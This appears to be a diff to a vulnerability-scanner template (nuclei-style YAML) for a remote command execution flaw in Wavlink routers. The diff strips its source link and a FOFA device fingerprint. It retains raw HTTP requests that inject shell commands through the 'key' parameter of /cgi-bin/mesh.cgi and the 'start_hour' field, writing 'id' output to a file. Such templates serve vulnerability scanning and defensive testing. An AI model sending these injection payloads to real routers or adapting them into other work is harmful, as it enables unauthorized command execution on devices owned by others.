@@ -3,12 +3,8 @@ info:
   name: Wavlink路由器远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ccv6ol1yo63fxhhr'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ccv6ol1yo63fxhhr
-    fofa: icon_hash="-1350437236"
 http:
 - raw:
   - 'POST /cgi-bin/mesh.cgi?page=upgrade&key=%27;id%3E%3Edudesite.txt'' HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     page=night_led&start_hour=;id;
